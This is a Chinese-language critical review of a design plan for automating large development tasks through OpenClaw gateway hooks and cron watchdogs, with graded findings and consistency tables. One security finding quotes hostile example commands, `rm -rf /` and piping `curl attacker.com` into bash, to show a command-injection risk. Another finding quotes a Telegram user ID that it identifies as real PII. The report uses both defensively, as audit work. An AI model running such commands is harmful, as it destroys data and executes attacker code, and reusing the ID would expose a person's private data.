# 批判性审查报告：自动化大型任务开发设计方案

> 审查人：worker-2（方案批判专家）
> 审查日期：2026-02-27
> 审查对象：`docs/内部参考/迭代需求/自动化大型任务开发设计方案.md`（~1917 行）
> 对照文档：
> - VK 依赖分析报告（947 行）
> - Heartbeat 替代 Cron 交叉验证研究报告（529 行）
> - VK 方案评审报告（183 行）

---

## 总体可行性评分：7.5 / 10

**评价**：方案方向正确，架构设计完整度高，前置文档的核心建议已充分吸收。主要扣分项集中在隐含假设未验证（hooks API 端口/认证）、仓内文件清单不完整、以及部分边界条件覆盖不足。补强 P0 前置验证后可提升至 8.5/10。

---

## 一、CRITICAL 级发现

### C1. OpenClaw Gateway 端口与认证方式完全未验证，方案核心前提悬空

**位置**：Ch 9.2（L1219）、Ch 14.1 Q1/Q2、Ch 4.1（L318 `hooks_gateway_url`）

**问题**：整个 hooks-first 架构的核心前提是 `/hooks/wake` 和 `/hooks/agent` HTTP API 可用。但截至方案编写时：
- Gateway 监听端口（`42800`）来源不明——研究报告源码审计给出的是 `server-http.ts:324-332` 的路由定义，但未确认实际部署端口
- 认证方式完全未知——是否需要 Bearer Token、API Key、或无认证？
- `task-runner-state.json` 中硬编码 `hooks_gateway_url: "http://localhost:42800"` 作为默认值，若端口错误则所有 hooks 调用静默失败

**对照**：评审报告 5.2 节将"OpenClaw 不可用时的降级路径"列为风险 TOP 2，设计方案虽在 Ch 12 R1 中列出缓解措施（cron watchdog 兜底），但 **P0 阶段的前置验证脚本（Ch 14.2）本身就依赖正确的端口和认证**——如果端口错误，验证脚本也会失败，形成循环依赖。

**建议**：
1. P0 阶段第一步应为手动检查 OpenClaw gateway 启动日志确认端口，而非运行验证脚本
2. `hooks_gateway_url` 应强制从环境变量读取（`OPENCLAW_GATEWAY`），禁止硬编码默认值
3. 补充认证方式的验证步骤

**严重程度**：CRITICAL——此假设不成立则 hooks-first 架构无法实施，需回退到纯 cron 方案

### C2. 3000 字符 Payload 迁移缺乏逐条对照验证机制

**位置**：附录 B（L1697-1744）、Ch 8.2-8.4、Ch 12.1 R8

**问题**：附录 B.1 将 3000 字符 payload 分解为五大语义块（路径声明 ~300 字符、执行协议 ~800 字符、决策矩阵 ~1000 字符、硬约束 ~600 字符、输出模板 ~300 字符），迁移目标也已明确（AGENTS.md / WORKFLOW_AUTO.md / VK_AGENT_PROMPTS.md）。但存在关键缺陷：

1. **无逐条对照 checklist**：风险 R8 的缓解措施为"逐条对照迁移 + 迁移前后行为对比测试"，但方案中没有给出具体的对照表模板（原约束条目 → 新位置 → 验证方式）
2. **"硬约束清单"中的 10+ 条禁止规则未逐条列出**：附录 B.1 仅给出"10+ 条禁止规则"的笼统描述，未展开具体内容。如果迁移时遗漏某条禁止规则（如"禁止 manual-db-fallback"），可能导致 LLM 行为偏移
3. **迁移后的行为等价性无验证标准**：如何证明迁移后的 AGENTS.md + WORKFLOW_AUTO.md + VK_AGENT_PROMPTS.md 组合与原 3000 字符 payload 行为等价？方案未定义验收标准

**对照**：评审报告 2.5 节明确指出"3000 字符约束是 LLM 行为指令，不是任务清单，语义不等价"。设计方案虽然吸收了这一反馈（将约束分层迁移），但验证机制仍然缺失。

**建议**：在附录 B 中增加迁移对照 checklist 表，格式为：`| 原约束编号 | 原文摘要 | 迁移目标文件 | 迁移后位置 | 验证方式 |`

**严重程度**：CRITICAL——payload 迁移遗漏是风险 R8，方案自身评估为"高"风险，但缓解措施不够具体

---

## 二、HIGH 级发现

### H1. 仓内文件改造清单严重不完整（5 个 vs 21 个）

**位置**：Ch 10.1（L1305-1311）

**问题**：Ch 10.1 仓内修改文件仅列出 5 个文件，但 VK 依赖分析报告 3.4.2 节明确列出 21 个需修改文件。缺失的文件包括：

| 缺失文件 | VK 报告中的改动类型 | 影响 |
|---------|-------------------|------|
| `.cursor/commands/jjk-vkplan.md` | 重写（~100 行） | VK 硬拦截规则未迁移 |
| `.cursor/commands/jjk-vktodo.md` | 重写（~150 行） | VK MCP 调用未清理 |
| `.cursor/commands/jjk-plan.md` | 小改（~20 行） | VK project_id 引用残留 |
| `CLAUDE.md` | 小改（~5 行） | VK 相关说明残留 |
| `.cursor/rules/mcp-routing.mdc` | 小改（~5 行） | VK MCP 路由规则残留 |
| 6 个 docs 文件 | 小改至中改 | 文档与实际架构不一致 |

**对照**：交叉审查记录中 worker-1 也发现了此问题（发现 #1），建议补充完整清单。

**建议**：Ch 10.1 应完整覆盖 VK 报告 3.4.2 节的 21 个文件，每个文件标注 Phase 归属。

### H2. 可删除文件清单不完整（1 个 vs 7 个）

**位置**：Ch 10.4（L1334-1339）

**问题**：Ch 10.4 仅列出 1 个可删除文件（`coder4_cron_state.json`），但 VK 报告 3.4.4 节列出 7 个可删除文件（4 个 `vk_*.sh` 脚本 + `jjk-vksync.md` + VK 测试文档 + `.mcp.json` VK 条目），合计约 778 行。虽然 Ch 10.4 注释说明"VK 缓存文件自然废弃"，但 Phase 3 应有明确的删除清单，否则实施时可能遗漏。

**建议**：补充 VK 报告 3.4.4 节的 7 个可删除文件，标注为 P3 阶段执行。

### H3. wt-flow.sh verify 子命令存在命令注入风险

**位置**：Ch 6.4（L774）

**问题**：`verify` 子命令使用 `eval "$check"` 执行 `acceptance_checks` 中的检查命令。`acceptance_checks` 来自 `vk_cards.json`，虽然当前由 `/jjk-vkplan` 生成（可信来源），但：

1. `vk_cards.json` 是人工可编辑的 JSON 文件，任何人都可以注入恶意命令
2. `eval` 在 bash 中执行任意字符串，无沙箱隔离
3. 如果 `acceptance_checks` 包含 `rm -rf /` 或 `curl attacker.com | bash`，将直接执行

**对照**：设计方案 Ch 1.3 C6 要求"原子写入"保护状态文件，但对执行层的安全性未做同等考量。

**建议**：
1. `acceptance_checks` 应限制为白名单命令（如 `pytest`、`ruff`、`grep`）
2. 或使用 `bash -c "$check"` 替代 `eval`，并在子 shell 中设置 `set -euo pipefail`
3. 增加命令长度和字符集校验

### H4. 并行模式（execution_mode=parallel）设计深度不足

**位置**：Ch 6.7（L862-882）、Ch 4.1（L313 `execution_mode`）

**问题**：并行模式的设计仅有 20 行描述（Ch 6.7），相比串行模式的详细设计（Ch 6.6 约 30 行 + Ch 5.4 完整伪代码），并行模式缺少：

1. **并发写入 `task-runner-state.json` 的冲突处理**：多个 worktree 同时完成时，`advance_card()` 可能并发写入同一个状态文件。原子写入（Ch 4.6）保证单次写入不损坏，但不保证并发写入的正确性（后写覆盖先写）
2. **`parallel-merge` 合并冲突的处理流程**：Ch 6.7 仅说"合并冲突时暂停，标记 blocked"，但未说明：哪些卡片标记 blocked？已成功合并的卡片是否回滚？如何恢复？
3. **并行模式下 `hooks/wake` 的触发时机**：串行模式下每张卡片完成后触发一次。并行模式下是每张卡片完成都触发，还是全部完成后触发一次？

**对照**：VK 报告 3.2.4 节的并行模式设计同样简略，设计方案未做深化。

**建议**：
1. 并发写入使用文件锁（`flock`）或乐观锁（`last_updated` 版本校验）
2. 补充 `parallel-merge` 冲突处理的完整流程图
3. 明确并行模式下的 hooks 触发策略

### H5. 单点故障从 VK 转移到 OpenClaw Gateway，降级路径不完整

**位置**：Ch 12.1 R1（L1456）、Ch 11.4（L1424-1446）

**问题**：方案将 VK 从执行链路移除，但引入了对 OpenClaw Gateway 的新依赖。Ch 11.4 设计了 hooks 降级链（wake → 重试 → agent → cron watchdog），但存在盲区：

1. **Gateway 完全不可用时**：如果 OpenClaw 进程崩溃，`/hooks/wake` 和 `/hooks/agent` 均不可用，cron watchdog 也由 OpenClaw cron runner 驱动——即 **cron watchdog 本身也依赖 OpenClaw**。此时整个链路停止，无外部恢复机制
2. **评审报告 5.2 节建议**："`bootstrap_kernel --local-mode` 应可通过系统 `crontab` 独立调度"。设计方案 Ch 12.1 R1 的缓解措施提到了这一点，但未给出具体实现（系统 crontab 配置、触发脚本、与 OpenClaw cron 的互斥机制）

**建议**：
1. 补充系统级 crontab 作为最终兜底的具体配置
2. 设计 OpenClaw 进程健康检查机制（如 `systemd` watchdog 或独立的 health check 脚本）

---

## 三、MEDIUM 级发现

### M1. Ch 5.4 与 Ch 9.2 的 Gateway 默认值来源不一致

**位置**：Ch 5.4（L544）vs Ch 9.2（L1219）

**问题**：
- Ch 5.4 `heartbeat_turn()` 函数签名中 `hooks_gateway` 默认值为字符串字面量 `"http://localhost:42800"`
- Ch 9.2 `trigger_next_round()` 使用 `os.getenv("OPENCLAW_GATEWAY", "http://localhost:42800")`

两处功能相同但获取方式不同。如果环境变量 `OPENCLAW_GATEWAY` 被设置为不同端口，Ch 5.4 的调用将使用错误的地址。

**建议**：全文统一为 `os.getenv("OPENCLAW_GATEWAY", "http://localhost:42800")`，Ch 5.4 需同步修正。

### M2. Ch 6.4 verify 子命令的 glob 路径在 bash 中不可用

**位置**：Ch 6.4（L758）

**问题**：`cards_file="docs/内部参考/任务拆解/**/vk_cards.json"` 使用 glob 模式，但 `jq` 命令不支持 glob 展开。实际执行时 `jq -r ".cards[]..." $cards_file` 会因文件路径包含 `**` 而失败。

**建议**：改为 `find` 命令定位文件，或从 `_active_task.json` 中读取 `task_key` 后构造确定性路径。

### M3. Telegram ID 硬编码在代码示例中

**位置**：Ch 9.3（L1247）

**问题**：`TELEGRAM_TO = os.getenv("CODER4_TELEGRAM_TO", "6358651433")` 虽然使用了环境变量，但默认值包含真实的 Telegram 用户 ID。这是 PII（个人可识别信息），不应出现在设计文档中。

**对照**：Ch 14.3 ADR-005 明确决策"Telegram ID 从环境变量读取，避免硬编码"，但代码示例违反了自身的 ADR。

**建议**：默认值改为空字符串或占位符（如 `"<TELEGRAM_USER_ID>"`），缺失时抛出明确错误。

### M4. 工时估算差异未充分解释

**位置**：Ch 13.3（L1592-1603）

**问题**：设计方案估算 13-19 天（期望 16 天），评审报告独立评估为 10-16 天。Ch 13.3 注释说"本方案含仓外文件重写和端到端验收，估算 13-19 天合理"，但未量化差异来源。

**数据自洽性检查**：
- VK 报告估算：仓内 8-13 天 + 仓外 3-5 天 = 11-18 天
- 评审报告修正：10-16 天
- 设计方案：13-19 天

设计方案的下限（13 天）高于评审报告的下限（10 天），差异 3 天。上限（19 天）高于评审报告上限（16 天），差异也是 3 天。这 3 天差异主要来自 P2 仓外清理（WORKFLOW_AUTO 460 行 + VK_AGENT_PROMPTS 628 行的重写）和端到端验收，但方案未明确说明。

**建议**：在 Ch 13.3 中补充差异分解表。

### M5. Schema 版本升级策略未定义

**位置**：Ch 4.2（L331 `schema_version`）

**问题**：`task-runner-state.json` 包含 `schema_version: "1.0.0"` 字段，Ch 5.2 代码中有版本校验（`if not version.startswith("1.")`）。但方案未定义：
1. 何时需要升级 schema 版本（新增字段？修改字段语义？删除字段？）
2. 版本升级时的迁移策略（自动迁移？手动迁移？向后兼容期多长？）
3. 不兼容版本的处理方式（当前仅 `raise ValueError`，无恢复路径）

**建议**：补充 schema 版本升级策略，至少定义 major/minor 版本的兼容性规则。

### M6. attempt 文件的清理策略缺失

**位置**：Ch 7.1（L921-932）

**问题**：attempt 文件按 `attempt_NNN.json` 递增存储在 `.omc/state/attempts/<card_id>/` 目录下。方案未定义：
1. 历史 attempt 文件何时清理？如果一张卡片重试 100 次，会产生 100 个文件
2. 磁盘空间监控机制？`.omc/state/` 目录无大小限制
3. 跨任务（不同 `task_key`）的 attempt 文件是否隔离？当前设计按 `card_id` 组织，不同任务的同名卡片（如 `C01`）会混在一起

**建议**：
1. 增加 attempt 文件保留策略（如保留最近 N 个或最近 M 天）
2. 按 `task_key` 隔离 attempt 目录：`.omc/state/attempts/<task_key>/<card_id>/`

---

## 四、LOW 级发现

### L1. Ch 6.3 next 子命令的 jq 原子写入缺少空输出校验

**位置**：Ch 6.3（L744-745）

**问题**：`jq ... "$state_file" > "$state_file.tmp" && mv "$state_file.tmp" "$state_file"` 模式中，如果 `jq` 因表达式错误输出空内容，`mv` 仍会执行，导致状态文件被清空。

**建议**：增加 `[[ -s "$state_file.tmp" ]]` 非空校验（交叉审查中 worker-2 已提出此建议）。

### L2. Ch 3.2 触发器能力表中 `/hooks/wake` 的幂等性描述需补充条件

**位置**：Ch 3.2（L233）

**问题**：表中标注 `/hooks/wake` 幂等性为"是（重复调用安全）"。但研究报告 5.1 节说明 `/hooks/wake` 内部调用 `requestHeartbeatNow()`，如果 heartbeat 正在执行中，重复调用是否会排队或丢弃？方案未说明。

**建议**：补充"幂等"的具体语义——是"重复调用不产生副作用"还是"重复调用会排队等待"。

### L3. Ch 9.3 异常恢复的 `consecutiveErrors >= 3` 阈值来源不明

**位置**：Ch 9.3（L1243）

**问题**：异常恢复场景使用 `consecutiveErrors >= 3` 作为触发条件，但 `task-runner-state.json` Schema（Ch 4.2）中没有 `consecutiveErrors` 字段。该字段是从 OpenClaw cron state 读取？还是需要新增到 Schema 中？

**建议**：明确 `consecutiveErrors` 的数据来源，如需新增则更新 Ch 4 Schema。

### L4. 附录 A.3 VK API 调用统计中"间接引用约 50 处"与评审报告数据不一致

**位置**：附录 A.3（L1692）

**问题**：附录 A.3 统计"间接引用（prompt/规则）~50 处"，但 VK 报告 3.1 节统计为"约 156 处（21 个文件）"，评审报告 2.7 节修正为"约 203 处"。三个数据来源不一致。

**数据自洽性**：设计方案的 ~50 处可能仅统计了 prompt/规则中的引用，而 VK 报告的 156/203 处包含了所有类型的引用（代码、命令、文档、规则）。但方案未说明统计口径差异。

**建议**：统一引用统计口径，或在附录 A.3 中标注"此处仅统计 prompt/规则中的间接引用"。

### L5. Ch 14.1 待决事项 Q6 的 `container_ref` 替代已在 Ch 7 解决但未关闭

**位置**：Ch 14.1 Q6（L1618）

**问题**：Q6 问"`container_ref` 和 `agent_working_dir` 的本地替代是否完备"，状态为"待验证"。但 Ch 7.3 已给出完整的能力对比表，Ch 7.4 已实现 `worktree_path` 替代 `container_ref`。Q6 应标记为"已解决"。

**建议**：更新 Q6 状态为"已解决，见 Ch 7.3-7.4"。

---

## 五、假设挑战

以下是方案依赖的隐含假设，逐一评估其成立条件：

| # | 隐含假设 | 成立条件 | 风险等级 | 当前状态 |
|---|---------|---------|---------|---------|
| A1 | OpenClaw Gateway 在 `localhost:42800` 监听 | 需检查 gateway 启动日志 | CRITICAL | 未验证 |
| A2 | `/hooks/wake` 和 `/hooks/agent` 无需认证 | 需实际 curl 测试 | CRITICAL | 未验证 |
| A3 | `heartbeat.prompt` 支持 3000 字符注入 | 需配置测试（Ch 14.1 Q3） | HIGH | 未验证 |
| A4 | OpenClaw Codex 执行超时后状态可恢复 | 需确认 `timeoutSeconds` 超时后的行为 | MEDIUM | 未验证 |
| A5 | `os.rename()` 在 macOS APFS 上是原子操作 | POSIX 标准保证同文件系统内原子 | LOW | 成立（APFS 符合 POSIX） |
| A6 | `jq` 在所有目标环境中可用 | macOS 默认不含 jq，需 brew install | LOW | 需确认部署环境 |
| A7 | 单一开发者使用，无并发写入 | 评审报告 Q5 确认 heartbeat 串行执行 | LOW | 成立（当前场景） |

---

## 六、边界条件覆盖评估

| # | 边界条件 | 是否覆盖 | 位置 | 评价 |
|---|---------|---------|------|------|
| B1 | `task-runner-state.json` 写入中断（断电/崩溃） | 覆盖 | Ch 4.6 原子写入 + .bak 备份 | 设计充分 |
| B2 | `vk_cards.json` 格式错误（JSON 解析失败） | 覆盖 | Ch 11.1 不可重试错误表 | 标记为 BLOCKED |
| B3 | `_active_task.json` 字段缺失 | 覆盖 | Ch 11.1 不可重试错误表 | 标记为 BLOCKED |
| B4 | hooks 调用网络超时 | 覆盖 | Ch 11.4 降级链 | 三级降级（重试→agent→cron） |
| B5 | 磁盘空间不足 | **未覆盖** | - | attempt 文件无限增长可能耗尽磁盘 |
| B6 | 并发写入 `task-runner-state.json` | **未覆盖** | - | 并行模式下可能发生 |
| B7 | worktree 创建失败（磁盘满/路径冲突） | 部分覆盖 | Ch 11.1 wt-flow.sh 执行失败 | 可重试但无具体恢复步骤 |
| B8 | OpenClaw 进程崩溃 | **未覆盖** | - | 所有触发器均依赖 OpenClaw |
| B9 | `card_order` 为空数组 | **未覆盖** | - | `decide_action()` 行为未定义 |
| B10 | `schema_version` 不兼容 | 部分覆盖 | Ch 5.2 版本校验 | 仅 raise，无恢复路径 |

---

## 七、数据自洽性检查

| # | 数据项 | 设计方案值 | 前置文档值 | 一致性 |
|---|--------|-----------|-----------|--------|
| D1 | VK 引用数量 | ~53 处（附录 A.3） | 156 处（VK 报告）/ 203 处（评审报告） | 不一致（统计口径不同） |
| D2 | bootstrap_kernel.py 行数 | 463 行 | 463 行（VK 报告） | 一致 |
| D3 | wt-flow.sh 行数 | 220 行（Ch 6.1）/ 232 行（Ch 10.1） | 220 行（VK 报告） | Ch 10.1 与 Ch 6.1 不一致（220 vs 232） |
| D4 | VK HTTP REST API 调用数 | 3 处 | 3 处（VK 报告 3.4.1） | 一致 |
| D5 | VK MCP 调用数 | 4 处 | 4 处（VK 报告 3.4.1） | 一致 |
| D6 | WORKFLOW_AUTO.md 行数 | 460 行（Ch 8.2） | 447 行（VK 报告 3.5.1）/ 459 行（评审报告 2.2） | 不一致（460 vs 447 vs 459） |
| D7 | VK_AGENT_PROMPTS.md 行数 | 628 行（Ch 8.3） | 622 行（VK 报告 3.5.1）/ 627 行（评审报告 2.2） | 不一致（628 vs 622 vs 627） |
| D8 | 工时估算 | 13-19 天 | 11-18 天（VK 报告）/ 10-16 天（评审报告） | 差异合理但未充分解释 |
| D9 | 触发器能力拆分表 | Ch 3.2 | 研究报告 5.8 节 | 完全一致 |
| D10 | 风险矩阵 | Ch 12.1 R1-R8 | 评审报告 5.1-5.3 | 核心风险已覆盖 |

**总结**：D3（wt-flow.sh 行数）和 D6/D7（仓外文件行数）存在小幅不一致，可能是文档编写时间差导致的自然偏差，不影响方案正确性。D1（VK 引用数量）的统计口径差异需标注说明。

---

## 八、评审报告建议吸收度

| 评审报告建议 | 是否吸收 | 吸收质量 | 对应章节 |
|-------------|---------|---------|---------|
| heartbeat PoC 验证 | 吸收（演化为 hooks PoC） | 良好 | Ch 14.2 前置验证脚本 |
| 3000 字符 payload 迁移目标 | 吸收 | 良好（但缺逐条 checklist） | Ch 8.3-8.4, 附录 B |
| attempt 系统完整替代 | 吸收 | 优秀 | Ch 7.3 能力对比表 |
| "保留 cron + 去 VK API"作为 Phase 0 | 吸收（演化为 hooks-first + cron-watchdog） | 优秀 | Ch 13.2 Phase 0 |
| 原子写入 | 吸收 | 优秀 | Ch 4.6 完整实现 |
| `dispatch_coder4` 拆分 | 部分吸收（保留但限定职责） | 可接受 | Ch 5.1 模块拆分说明 |
| 三层真理源层级 | 吸收 | 优秀 | Ch 3.5 层级定义 |
| 不可重试错误清单补充 | 吸收 | 良好 | Ch 11.1 错误分类表 |
| VK 只读推送定期全量同步 | 吸收 | 良好 | Ch 13.2 P3.3 |
| OpenClaw 不可用降级路径 | 部分吸收 | 需补强 | Ch 12.1 R1（缺系统 crontab 具体配置） |

**吸收率**：10 项建议中 8 项充分吸收，2 项部分吸收。整体吸收度良好。

---

## 九、总结与建议

### 发现汇总

| 严重程度 | 数量 | 关键发现 |
|---------|------|---------|
| CRITICAL | 2 | Gateway 端口/认证未验证；Payload 迁移缺逐条对照 |
| HIGH | 5 | 文件清单不完整；verify 命令注入；并行模式设计不足；单点故障转移 |
| MEDIUM | 6 | Gateway 默认值不一致；glob 路径错误；Telegram ID 硬编码；工时差异；Schema 升级；attempt 清理 |
| LOW | 5 | jq 空输出；幂等性语义；consecutiveErrors 来源；引用统计口径；Q6 未关闭 |

### 优先修复建议

1. **P0 阶段启动前（阻塞项）**：
   - 手动验证 OpenClaw Gateway 端口和认证方式（C1）
   - 验证 `heartbeat.prompt` 3000 字符注入能力（A3）

2. **P1 阶段开始前**：
   - 补充 Ch 10.1 仓内文件完整清单（H1）
   - 补充 Ch 10.4 可删除文件完整清单（H2）
   - 在附录 B 增加 payload 迁移逐条对照 checklist（C2）

3. **P1 阶段实施中**：
   - 修复 verify 子命令的命令注入风险（H3）
   - 补充并行模式的并发写入处理（H4）
   - 统一 Gateway 默认值获取方式（M1）

4. **P2 阶段开始前**：
   - 设计系统级 crontab 兜底配置（H5）
   - 定义 Schema 版本升级策略（M5）

### 方案亮点

1. **hooks-first + cron-watchdog 混合方案**：充分利用了研究报告第二轮发现的 `/hooks/wake` 和 `/hooks/agent` API，在零等待和可靠性之间取得了良好平衡
2. **三层真理源层级设计**：清晰定义了 `_active_task.json` > `vk_cards.json` > `task-runner-state.json` 的优先级，回应了评审报告"唯一真理源"表述不准确的反馈
3. **原子写入实现**：Ch 4.6 的 write-to-temp + `os.rename` + `.bak` 备份方案完整且正确
4. **attempt 系统本地化**：Ch 7.3 的能力对比表逐项回应了评审报告 2.6 节的 5 项质疑，替代方案设计充分
5. **前置文档引用准确**：全文引用来源标注清晰，章节间交叉引用正确，与三份前置文档的数据基本自洽
6. **分阶段实施 + 每阶段回滚方案**：Ch 13.2 每个 Phase 都有明确的回滚方案，降低了实施风险

---

*批判性审查完成。总体评分 7.5/10，补强 P0 前置验证和文件清单后可提升至 8.5/10。*
